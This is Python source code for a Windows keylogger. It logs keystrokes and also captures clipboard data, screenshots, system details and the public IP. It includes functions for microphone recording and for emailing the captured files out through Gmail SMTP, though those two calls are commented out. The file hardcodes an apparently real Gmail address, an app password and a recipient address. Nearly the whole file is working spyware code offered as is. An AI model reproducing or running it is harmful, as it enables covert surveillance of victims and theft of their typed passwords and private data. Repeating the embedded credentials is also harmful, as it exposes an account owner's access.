from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_info = "key_log.txt"
system_info ="systeminfo.txt"
clipboard_info ="clipboard_log.txt"
audio_info = "audio.wav"
screenshot_info ="screenshot.png"

microphone_time = 10

email_address = "bharath.dh03@gmail.com"
password = "krcpqwiagkewvfvb"
toaddr = "bharathbdh65@gmail.com"

file_path = "C:\\Users\\BHARA\\Desktop\\Keylogger"
extend = "\\"

def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Logger"
    body = "Hello from keylogger"
    msg.attach(MIMEText(body,'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition',"attachment:filename=%s" % filename)
    msg.attach(p)
    s = smtplib.SMTP_SSL('smtp.gmail.com',465)
    s.ehlo()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr,toaddr,text)
    s.quit()

#send_email(keys_info, file_path + extend + keys_info, toaddr)

def computer_info():
    with open(file_path + extend + system_info, "a") as f:
        hostname = socket.gethostname()
        IPaddress = socket.gethostbyname(hostname)
        try:
            public_IP = get("https://api.ipify.org").text
            f.write("Public IP" + public_IP + '\n')
        except Exception:
            f.write("Couldn't get Public IP")
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + "" + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname :" + hostname + '\n')
        f.write("Private IP: " + IPaddress + '\n')

computer_info()


def copy_clipboard():
    with open(file_path + extend + clipboard_info,"a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)
        except:
            f.write("Clipboard could not be copied")

copy_clipboard()

def microphone_data():
    sampling_freq = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * sampling_freq), samplerate=sampling_freq, channels=2)
    sd.wait()

    write(file_path + extend + audio_info, sampling_freq,myrecording)

# microphone_data()

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_info)

screenshot()



count = 0
keys =[]

def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count+=1

    if count >=1:
        count = 0
        write_file(keys)
        keys=[]

def write_file(keys):
    with open(file_path + extend + keys_info, "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key == Key.esc:
        return False
    

with Listener(on_press =on_press, on_release=on_release) as listener:
    listener.join()











